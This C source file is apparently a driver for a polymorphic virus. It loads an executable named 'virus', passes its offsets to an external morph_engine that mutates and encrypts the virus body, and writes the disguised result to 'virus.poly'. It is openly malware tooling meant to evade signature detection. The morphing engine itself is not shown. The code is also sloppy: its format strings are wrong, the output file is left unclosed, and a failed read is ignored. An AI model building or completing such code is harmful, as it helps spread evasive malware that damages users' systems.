#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <bfd.h>

extern int morph_engine(char* exe_data, size_t virus_instruction_begin, size_t virus_encrypt_size, size_t virus_decrypt_offset, size_t full_addr_enc_begin);
// extern int decrypt_engine(char* exe_data,size_t full_addr_enc_begin ,size_t virus_instruction_begin, size_t virus_encrypt_size, size_t virus_decrypt_offset);

int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encrypt_size, unsigned long virus_decrypt_offset)
{
      // // int i;
      // // for (i=0; i<argc; ++i) {
      // // printf("polymorphic argv[%d]=%s\n", i, argv[i]);
      // // }

	// // virus name
	char filename[] = "virus";

      printf("%ul\n", virus_instruction_begin);
      printf("%ul\n", virus_encrypt_size);
      printf("%ul\n", virus_decrypt_offset);
	
	unsigned long full_addr_enc_begin = virus_instruction_begin;

	// to get offset just delete the most significant char
	char buffer1[15];
	sprintf(buffer1, "%06lx", (unsigned long)virus_instruction_begin);
	char *main_offset = buffer1;
	write(1, main_offset, strlen(main_offset));
	main_offset = main_offset + 1;
	write(1, main_offset, strlen(main_offset));
	printf("\n");

	char buffer3[15];
	sprintf(buffer3, "%06lx", (unsigned long)virus_decrypt_offset);
	char *decryption_offset = buffer3;
	decryption_offset = decryption_offset + 1;
	write(1, decryption_offset, strlen(decryption_offset));

	printf("\n");


      virus_instruction_begin  = (int)strtol(main_offset, NULL, 16);
	virus_decrypt_offset  = (int)strtol(decryption_offset, NULL, 16);

      printf("%ul\n", virus_instruction_begin);
      printf("%ul\n", virus_decrypt_offset);

      // open the executable file
	FILE* exe_file = fopen(filename, "rb");
	if(!exe_file)
	{
		printf("Failed to open %s\n", filename);
		return -1;
	}

	// get the size of the executable file
	size_t exe_size;
	fseek(exe_file, 0, SEEK_END);
	exe_size = ftell(exe_file);
	rewind(exe_file);

	// allocate the data
	char* exe_data = malloc(exe_size);
	if(!exe_data)
	{
		fclose(exe_file);
		printf("Executable data allocation failed\n");
		return 1;
	}

	// read the entire executable file
	if(!fread(exe_data, exe_size, 1, exe_file))
	{
		fclose(exe_file);
		printf("Executable file read failed\n");
	}

	// close the file
	fclose(exe_file);



	// call the polymorphic engine
	if(morph_engine(exe_data, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset, full_addr_enc_begin) != 0)
	{
		printf("An error occured in the polymorphic engine\n");

	}

	// initialize the output filename
	char out_filename[FILENAME_MAX];
	snprintf(out_filename, FILENAME_MAX, "%s.poly", filename);
      printf("/n");
	// open the output file
	FILE* out_file = fopen(out_filename, "wb");
	if(!out_file)
	{
		printf("failed to open %s\n", out_filename);
		// goto quit;
	}

	// write the modified executable data
	if(!fwrite(exe_data, exe_size, 1, out_file))
	{
		printf("failed to write into %s\n", out_filename);
	}

      quit:
            free(exe_data);
      return 0;

}